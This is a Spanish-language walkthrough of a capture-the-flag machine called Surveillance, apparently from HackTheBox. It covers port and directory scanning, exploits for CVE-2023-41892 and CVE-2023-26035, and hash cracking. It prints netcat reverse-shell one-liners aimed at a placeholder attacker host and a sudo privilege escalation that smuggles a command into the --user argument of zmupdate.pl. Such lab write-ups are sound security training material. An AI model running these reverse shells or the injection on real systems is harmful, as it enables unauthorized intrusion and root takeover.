<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Surveillance</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Surveillance</h1><br/><p><ol><li>Realizo un escaneo de NMAP para ver que puertos  están abiertos</br><strong> nmap -Pn -sC -sV -p- --open &lt;IP&gt; -oN scan.txt</strong></li><li>Están abiertos los piertos 22 (OpenSSH 8.9p1) y 80 (nginx 1.18.0)</li><li>No encuentra la pagina web por lo que la añadimos a los dominions /etc/hosts </li></ol><img src="images/35-1.png" alt="images/35-1.png" /><ol><li>Realizo un escaneo de directorios para ver si encuentra algún login o algo  interesante </br><strong>gobuster dir -u <a href="http://surveillance.htb/">http://surveillance.htb/</a> -w /usr/share/wordlists/dirb/big.txt</strong></li><li>Encuentro el directorio /admin/login</li><li>Buscando en el código de  la página web encuentro un enlace a un repositorio de github </li></ol><img src="images/35-2.png" alt="images/35-2.png" /><ol><li>Por lo que parece ser tenemos la versión</li><li>Encuentro el CVE-2023-41892 que permite RCE</li><li>Ya tenemos un reverse shell </li></ol><img src="images/35-3.png" alt="images/35-3.png" /><ol><li>Mi siguiente objetivo será tener un reverse shell más estable</li><li>Creo un reverse con msfvenom  </br><strong>   msfvenom -p cmd/unix/reverse_netcat LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; R</strong></li><li>Y nos devuelve el código que tenemos que ejecutar  <strong>   mkfifo /tmp/ypev; nc &lt;IP&gt; &lt;PORT&gt; 0&lt;/tmp/ypev | /bin/sh &gt;/tmp/ypev 2&gt;&amp;1; rm /tmp/ypev</strong></li><li>Obtengo el shell en mi netcat</li><li>Upgradeo el shell para que sea más interactivo con Python</br><strong> python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</strong></li><li>Encuentro dos usuarios. <strong>Matthew</strong> u <strong>zoneminder</strong></li><li>Encuentro un archivo que puede contener información importante </li></ol><img src="images/35-4.png" alt="images/35-4.png" /><ol><li>Me mando el archivo a mi máquina </li></ol><img src="images/35-5.png" alt="images/35-5.png" /><ol><li><img src="images/35-6.png" alt="images/35-6.png" /><ol><li>Busco los usuarios que encontre en el archivo sql </li></ol><img src="images/35-7.png" alt="images/35-7.png" /><ol><li>Encuentro un hash</li><li>Uso hash id para ver que tipo de hash es y poder crackearlo</li><li>Después de crackear el hash obtengo la contraseña y entro con el usuario matthew</li><li>Lo hago a través de ssh para tener una conexión buena y estable </li></ol><img src="images/35-8.png" alt="images/35-8.png" /><ol><li>Encuentro la flag user.txt en el directorio home de matthew</li><li>Parece ser que hay una app llamada zoneminder </li></ol><img src="images/35-9.png" alt="images/35-9.png" /><ol><li>Parece ser que se está ejecutando en otro puerto </li></ol><img src="images/35-10.png" alt="images/35-10.png" /><ol><li>Debe estar en otra red por lo que usaré la máquina que ataqué para hacer un portforwarding a través de ssh.</br><strong> ssh -L 4444:127.0.0.1:8080 matthew@surveillance.htb</strong></li><li>Ahora si que podemos acceder a esta página </li></ol><img src="images/35-11.png" alt="images/35-11.png" /><ol><li>Ahora tengo que buscar la versión de zoneminder para ver si puedo usar un exploit para obtener un RCE </li></ol><img src="images/35-12.png" alt="images/35-12.png" /><ol><li>Encuentro el  CVE-2023-26035</li><li>Obtengo un reverse shell </li></ol><img src="images/35-13.png" alt="images/35-13.png" /><ol><li>Con <strong>sudo -l</strong> encuentro que se puede ejecutar este comando como root </li></ol><img src="images/35-14.png" alt="images/35-14.png" /><ol><li>Creo un reverse en /tmp </br><strong>echo &#39;#!/bin/bash busybox nc &lt;IP&gt; &lt;PORT&gt; -e sh&#39; &gt; myscript.sh</strong></li><li>lo paso a la maquina atacada y le asigno permisos</li><li>Ejecuto este comando para poder escalar privilegios <strong>  sudo /usr/bin/zmupdate.pl --version=1 --user=&#39;$(/tmp/reverse.sh)&#39; --pass=ZoneMinderPassword2023</strong></li><li>Obtengo la flag root</li></ol></p><p align="center"></p></div>
</body>
</html>
